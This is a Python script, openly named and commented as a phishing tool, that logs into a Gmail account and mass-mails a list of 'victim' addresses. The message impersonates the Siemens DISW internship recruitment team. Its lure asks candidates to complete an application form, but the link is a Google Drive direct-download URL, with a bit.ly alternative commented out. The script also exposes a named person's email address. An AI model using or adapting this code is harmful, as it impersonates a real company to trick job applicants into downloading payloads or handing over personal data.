import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_phishing_emails(email_list_path, voucher_link):
    # Read victim emails
    with open(email_list_path, 'r') as f:
        victim_emails = [line.strip() for line in f.readlines()]
    
    sender_email = "ghanemmariam26@gmail.com"
    sender_password = ""
    smtp_server = "smtp.gmail.com"
    smtp_port = 587

    # Open connection once
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(sender_email, sender_password)

    for recipient in victim_emails:
        msg = MIMEMultipart("alternative")
        msg['From'] = f"Mariam Ghanem <{sender_email}>"
        msg['To'] = recipient
        msg['Subject'] = "Next Steps: Siemens DISW 2025 Internship Application"
        msg.add_header("List-Unsubscribe", f"<mailto:{sender_email}?subject=unsubscribe>")

        body = f"""Dear Candidate,

Your application for the 2025 Summer Internship Program at Siemens DISW is progressing to the next stage.

To continue your application process, please complete our candidate information form:
{voucher_link}

Required Information:
- Complete personal and academic details
- Verified contact information
- Confirmed availability dates

Submission deadline: Saturday

Best regards,
Siemens DISW Recruitment Team
"""

        html = f"""\
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Siemens DISW Internship Program</title>
  </head>
  <body style="font-family: Arial, sans-serif; font-size: 15px; color: #222; background-color: #f4f4f4; margin: 0; padding: 20px;">
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="max-width: 600px; margin: auto; background-color: #ffffff; padding: 30px; border-radius: 8px;">
      <tr>
        <td>
          <h2 style="color: #006666; margin-top: 0;">Siemens DISW Internship Program</h2>
          <p>Dear Candidate,</p>
          <p>Your application for the <strong>2025 Summer Internship Program</strong> at Siemens DISW is progressing to the next stage.</p>
          <p>To continue your application process, please complete our candidate information form:</p>
          <p style="text-align: center; margin: 25px 0;">
            <a href="{voucher_link}" style="background-color: #008080; color: #ffffff; text-decoration: none; padding: 12px 24px; border-radius: 5px; font-weight: bold; display: inline-block;">Complete Application Form</a>
          </p>
          <h4 style="margin-bottom: 5px;">Required Information:</h4>
          <ul style="padding-left: 20px; margin-top: 5px;">
            <li>Complete personal and academic details</li>
            <li>Verified contact information</li>
            <li>Confirmed availability dates</li>
          </ul>
          <h4 style="margin-top: 20px;">Key Information:</h4>
          <p>Submission deadline: <strong>Saturday</strong></p>
          <p>Best regards,<br><strong>Siemens DISW Recruitment Team</strong></p>
        </td>
      </tr>
    </table>
  </body>
</html>
"""
        # Attach both plain text and HTML
        msg.attach(MIMEText(body, 'plain'))
        msg.attach(MIMEText(html, "html"))

        try:
            server.sendmail(sender_email, recipient, msg.as_string())
            print(f"[✓] Email sent to {recipient}")
        except Exception as e:
            print(f"[!] Failed to send to {recipient}: {e}")

    server.quit()

# Example usage
# send_phishing_emails("victim_emails.txt", "https://drive.google.com/file/d/1S1y6oGzOMKepD7n_fYMU0mU8fGTtW5KO/view?usp=sharing")
send_phishing_emails("victim_emails.txt", "https://drive.google.com/uc?export=download&id=1jkz7S6vswVSQX6_yWFzR9VnLN1pA2rah")
# send_phishing_emails("victim_emails.txt", "https://bit.ly/42TywS3")